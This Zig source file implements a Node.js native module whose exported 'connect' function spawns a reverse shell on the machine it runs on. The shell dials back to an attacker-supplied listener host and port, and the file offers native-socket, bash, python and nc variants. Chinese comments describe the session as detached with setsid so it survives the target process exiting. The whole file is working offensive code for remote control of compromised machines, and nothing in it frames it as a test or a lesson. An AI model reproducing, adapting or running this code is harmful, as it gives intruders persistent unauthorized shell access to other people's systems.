const std = @import("std");
const builtin = @import("builtin");
const tokota = @import("tokota");
const runner = @import("runner.zig");

const is_linux = builtin.os.tag == .linux;
const session = if (is_linux) @import("session.zig") else struct {
    pub const STATUS_OK: u8 = 'C';
    pub const STATUS_FAIL: u8 = 'F';
    pub const Resolved = struct { head: ?*anyopaque = null };
    pub fn resolve(_: [:0]const u8, _: u16) anyerror!Resolved {
        return error.LinuxOnly;
    }
    pub fn childMain(_: runner.Variant, _: Resolved, _: ?[]const u8, _: u32, _: std.posix.fd_t) noreturn {
        unreachable;
    }
};

comptime {
    tokota.exportModule(@This());
}

const default_connect_timeout_s: u32 = 10;
const max_connect_timeout_s: u32 = 120;

fn optString(call: tokota.Call, params: tokota.Object, key: [:0]const u8, allocator: std.mem.Allocator) !?[]const u8 {
    const val = params.get(key) catch return null;
    if (try val.isNullOrUndefined(call.env)) return null;
    const coerced = try val.stringCoerce(call.env);
    const s = try coerced.stringAlloc(call.env, allocator);
    if (s.len == 0) {
        allocator.free(s);
        return null;
    }
    return s;
}

/// 反弹 Shell：在目标机派生连回 listener 的 shell 会话。
///
/// 参数：
/// - host: listener 地址（IP 或域名）
/// - port: listener 端口
/// - variant: 可选，native | bash | python | nc，默认 native（socket 零依赖直连）
/// - timeout: 可选，connect 超时秒数（默认 10，上限 120）
pub fn connect(call: tokota.Call) !tokota.Promise {
    if (comptime !is_linux) {
        return error.LinuxOnly;
    }
    const allocator = std.heap.c_allocator;
    const args = try call.argsAs(.{tokota.Val});
    const params = args[0].object(call.env);

    const host_raw = (try optString(call, params, "host", allocator)) orelse return error.HostRequired;
    // getaddrinfo 需要 NUL 结尾；host_z 按 session.zig 约定派生后不 free
    const host = try allocator.dupeZ(u8, host_raw);
    errdefer allocator.free(host);

    var port: u16 = 0;
    if (params.getT("port", f64)) |fv| {
        if (fv < 1 or fv > 65535 or @floor(fv) != fv) return error.BadPort;
        port = @intFromFloat(fv);
    } else |_| {}

    if (port == 0) return error.BadPort;

    var variant: runner.Variant = .native;
    if (try optString(call, params, "variant", allocator)) |raw| {
        defer allocator.free(raw);
        variant = runner.parseVariant(raw) orelse return error.BadVariant;
    }

    var timeout_s: u32 = default_connect_timeout_s;
    if (params.getT("timeout", f64)) |fv| {
        if (fv > 0) timeout_s = @intFromFloat(@min(fv, max_connect_timeout_s));
    } else |_| {}

    const pipe = try allocator.create(SessionPipe);
    errdefer allocator.destroy(pipe);
    errdefer allocator.free(host);
    pipe.* = .{
        .allocator = allocator,
        .host = host,
        .port = port,
        .variant = variant,
        .timeout_s = timeout_s,
    };

    const promise, const deferred = try call.env.promise();
    pipe.deferred = deferred;
    pipe.work = try call.env.asyncWorkerT(pipe, SessionPipe.execute, SessionPipe.complete, .{
        .name = "reverse-shell-connect",
    });
    errdefer pipe.work.delete(call.env) catch {};

    try pipe.work.schedule(call.env);
    return promise;
}

// 一次会话派生的跨线程状态。
// host 与后续解析结果/命令串按 session.zig 文件头约定刻意不 free
// （子进程 COW 只读 + 单次派生小泄漏换 fork 后零分配安全）。
const SessionPipe = struct {
    allocator: std.mem.Allocator,
    host: [:0]const u8,
    port: u16,
    variant: runner.Variant,
    timeout_s: u32,
    status_r: std.posix.fd_t = -1,
    status_w: std.posix.fd_t = -1,
    deferred: tokota.Deferred = undefined,
    work: tokota.async.Worker = undefined,
    output: ?[]const u8 = null,

    // worker 线程：解析 → fork → 子进程派生会话 → 父进程读状态。
    fn execute(self: *SessionPipe) !void {
        const linux = std.os.linux;

        var fds = [2]std.posix.fd_t{ -1, -1 };
        if (@as(isize, @bitCast(linux.pipe2(&fds, .{ .CLOEXEC = true }))) < 0) {
            self.output = "[ERRO] pipe failed";
            return;
        }
        self.status_r = fds[0];
        self.status_w = fds[1];

        // 解析必须在 fork 前（getaddrinfo 会分配内存，子进程零分配纪律）
        const resolved = session.resolve(self.host, self.port) catch {
            self.output = "[ERRO] resolve failed（域名不可解析或地址非法）";
            return;
        };

        // 解释器变体的命令串在 fork 前构建
        var cmd: ?[:0]const u8 = null;
        if (self.variant != .native) {
            cmd = runner.buildShellCommand(self.allocator, self.variant, .{ .host = self.host, .port = self.port }) catch null;
        }

        const pid = linux.fork();
        if (@as(isize, @bitCast(pid)) < 0) {
            self.output = "[ERRO] fork failed";
            return;
        }

        if (pid == 0) {
            _ = linux.close(self.status_r);
            self.status_r = -1;
            session.childMain(self.variant, resolved, cmd, self.timeout_s, self.status_w);
        }

        // 父进程：关写端，读状态（'C'=connect ok / EOF=spawn ok / 'F'=失败）
        _ = linux.close(self.status_w);
        self.status_w = -1;

        const deadline_ns = monoNs() + (@as(i128, self.timeout_s) + 5) * std.time.ns_per_s;
        var pfds = [_]std.posix.pollfd{.{ .fd = self.status_r, .events = std.posix.POLL.IN, .revents = 0 }};
        while (true) {
            const now = monoNs();
            if (now >= deadline_ns) break;
            const n = std.posix.poll(&pfds, @intCast(@min(@divFloor(deadline_ns - now, std.time.ns_per_ms), std.math.maxInt(i32)))) catch 0;
            if (n == 0) break;
            var byte: u8 = 0;
            const r = std.posix.read(self.status_r, @ptrCast(&byte)) catch 0;
            if (r == 0) {
                // EOF：exec 成功、CLOEXEC 写端已关闭
                self.output = switch (self.variant) {
                    .native => std.fmt.allocPrint(self.allocator, "[INFO] reverse shell connected: {s}:{d} (native；会话已 setsid 驻留，目标进程退出不受影响)", .{ self.host, self.port }) catch null,
                    else => std.fmt.allocPrint(self.allocator, "[INFO] interpreter payload spawned: {s} → {s}:{d}", .{ self.variant.label(), self.host, self.port }) catch null,
                };
                return;
            }
            if (r == 1 and byte == session.STATUS_OK) {
                self.output = std.fmt.allocPrint(self.allocator, "[INFO] reverse shell connected: {s}:{d} (native；会话已 setsid 驻留，目标进程退出不受影响)", .{ self.host, self.port }) catch null;
                return;
            }
            if (r == 1 and byte == session.STATUS_FAIL) {
                self.output = std.fmt.allocPrint(self.allocator, "[ERRO] {s} → {s}:{d} 失败（connect/exec 被拒，请核对 listener 侧）", .{ self.variant.label(), self.host, self.port }) catch null;
                return;
            }
        }
        self.output = "[ERRO] 子进程未在时限内报告状态";
    }

    // JS 线程：resolve/reject Promise。
    fn complete(self: *SessionPipe, env: tokota.Env, err: anyerror!void) !void {
        defer self.deinit();
        if (err) |_| {
            if (self.output) |o| {
                try self.deferred.resolve(env, o);
            } else {
                try self.deferred.reject(env, try env.err("reverse shell failed", {}));
            }
        } else |_| {
            try self.deferred.reject(env, try env.err("reverse shell failed: napi error", {}));
        }
    }

    // host/解析结果/命令串按 session.zig 约定不释放；这里只关父进程侧 fd。
    fn deinit(self: *SessionPipe) void {
        const linux = std.os.linux;
        if (self.status_r >= 0) _ = linux.close(self.status_r);
        if (self.status_w >= 0) _ = linux.close(self.status_w);
        self.allocator.destroy(self);
    }
};

fn monoNs() i128 {
    const clk: std.c.clockid_t = if (comptime is_linux)
        @as(std.os.linux.clockid_t, .MONOTONIC)
    else
        1; // darwin CLOCK_MONOTONIC
    var ts: std.c.timespec = undefined;
    _ = std.c.clock_gettime(clk, &ts);
    return @as(i128, ts.sec) * std.time.ns_per_s + ts.nsec;
}
